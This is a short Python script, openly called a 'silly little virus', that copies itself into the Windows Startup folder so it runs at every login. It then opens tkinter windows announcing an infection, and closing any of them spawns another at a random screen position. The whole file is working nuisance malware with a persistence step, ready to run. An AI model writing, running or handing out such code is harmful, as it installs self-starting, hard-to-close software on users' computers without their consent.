import tkinter as tk
from tkinter import font
import random
import os
import shutil

# Get the current script's path
script_path = os.path.abspath(__file__)

# Get the user's startup folder path
startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

# Check if the script is already in the startup folder
startup_script_path = os.path.join(startup_folder, os.path.basename(script_path))
if not os.path.exists(startup_script_path):
    # Copy the script to the startup folder
    shutil.copy2(script_path, startup_script_path)
    print("Hello >.<")
    print("I'm your silly little virus :D")

def create_new_window():
    new_window = tk.Tk()
    new_window.title("Siwwy wittle virus <3")
    new_window.protocol("WM_DELETE_WINDOW", lambda: create_new_window())

    # Remove the minimize and maximize buttons
    new_window.attributes('-toolwindow', 1)

    # Remove the maximize button from the window decorations
    new_window.resizable(False, False)

    # Create a bold font
    bold_font = font.Font(weight="bold")

    label = tk.Label(new_window, text="Im just a silly little virus >.<", fg="red", font=bold_font)
    label.pack()

    # Position the new window randomly on the screen
    screen_width = new_window.winfo_screenwidth()
    screen_height = new_window.winfo_screenheight()
    x = random.randint(0, screen_width - 200)
    y = random.randint(0, screen_height - 10)
    new_window.geometry(f"200x20+{x}+{y}")

    new_window.mainloop()

root = tk.Tk()
root.title("Siwwy wittle virus :p")

# Disable window close button
root.protocol("WM_DELETE_WINDOW", lambda: create_new_window())

# Remove the minimize and maximize buttons
root.attributes('-toolwindow', 1)

# Remove the maximize button from the window decorations
root.resizable(False, False)

# Create a bold font
bold_font = font.Font(weight="bold")

label = tk.Label(root, text="Hello, your computer has a virus\n a silly little virus\n That virus is me :p", fg="red", font=bold_font)
label.pack()

root.mainloop()
